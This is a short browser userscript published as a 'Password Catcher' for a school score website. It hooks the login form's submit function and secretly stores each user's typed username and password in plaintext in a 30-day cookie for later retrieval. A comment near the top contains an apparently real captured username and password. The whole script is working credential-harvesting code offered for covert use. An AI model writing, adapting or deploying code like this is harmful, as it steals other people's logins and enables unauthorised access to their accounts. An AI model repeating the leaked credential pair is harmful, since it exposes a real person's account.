// ==UserScript==
// @name         DYSYZX Score Website Password Catcher
// @version      0.1
// @namespace    https://codezhangborui.github.io
// @description  Shhhhhh...
// @author       CodeZhangBorui
// @match        http://172.140.170.136/
// @match        http://172.140.170.136/logindao
// @match        http://172.140.170.136/index.jsp
// @match        http://218.56.181.49/
// @match        http://218.56.181.49/logindao
// @match        http://218.56.181.49/index.jsp
// @grant        GM_registerMenuCommand
// @grant        GM_notification
// @license      MIT
// @downloadURL https://update.greasyfork.org/scripts/453202/DYSYZX%20Score%20Website%20Password%20Catcher.user.js
// @updateURL https://update.greasyfork.org/scripts/453202/DYSYZX%20Score%20Website%20Password%20Catcher.meta.js
// ==/UserScript==

//上次截取“用户, 密码.”：13780786317, 251905.

(function() {
    'use strict';
    //注意：请在合理范围内正确使用该脚本，如错误使用造成不良后果本作者不负任何责任！
    console.log("注意：请在合理范围内正确使用该脚本，如错误使用造成不良后果本作者不负任何责任！");
    function getCookie(cname) {
        var name = cname + "=";
        var decodedCookie = decodeURIComponent(document.cookie);
        var ca = decodedCookie.split(';');
        for(var i = 0; i <ca.length; i++) {
            var c = ca[i];
            while (c.charAt(0) == ' ') {
                c = c.substring(1);
            }
            if (c.indexOf(name) == 0) {
                return c.substring(name.length, c.length);
            }
        }
        return "";
    }
    console.log(`上次截取“用户, 密码.”：${getCookie("pwdcatch")}`);
    submt = function() {
        function setCookie(cname, cvalue, exdays) {
            var d = new Date();
            d.setTime(d.getTime() + (exdays*24*60*60*1000));
            var expires = "expires="+ d.toUTCString();
            document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
        }

        var iv   = 'NHIIwsyjnhiiWSYJ';
        var susername = $("#username").val();
        var spassword = $("#password").val();
        setCookie("pwdcatch", `${susername}, ${spassword}.`,30);
		var username = getAesString($("#username").val(),$("#enckey").val(),iv);  //对数据加密
        var password = getAesString($("#password").val(),$("#enckey").val(),iv);
        $("#username1").val(username);
        $("#password1").val(password);
		document.getElementById('form1').submit();
    }
})();